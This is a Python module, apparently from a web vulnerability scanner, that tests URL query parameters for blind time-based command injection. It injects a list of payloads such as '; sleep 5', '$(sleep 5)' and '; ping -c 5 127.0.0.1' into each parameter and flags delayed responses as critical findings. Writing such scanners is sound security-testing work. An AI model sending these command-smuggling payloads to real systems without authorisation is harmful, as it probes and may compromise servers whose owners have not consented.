"""Advanced command injection: blind, time-based, OOB."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse, time

BLIND_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        for payload in BLIND_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            start = time.time()
            r = get(new_url, timeout=15)
            elapsed = time.time() - start
            if r.status != 0 and elapsed >= 4:
                findings.append(Finding(
                    id="cmdi-blind-{}-{}".format(param, hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="Blind Command Injection",
                    severity="critical",
                    url=new_url,
                    parameter=param,
                    payload=payload,
                    evidence="Response delayed {}s".format(round(elapsed, 2)),
                    response_snippet=r.snippet(200),
                    confidence=0.7,
                ))
                break
    log_event(parsed.netloc, "cmdi_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
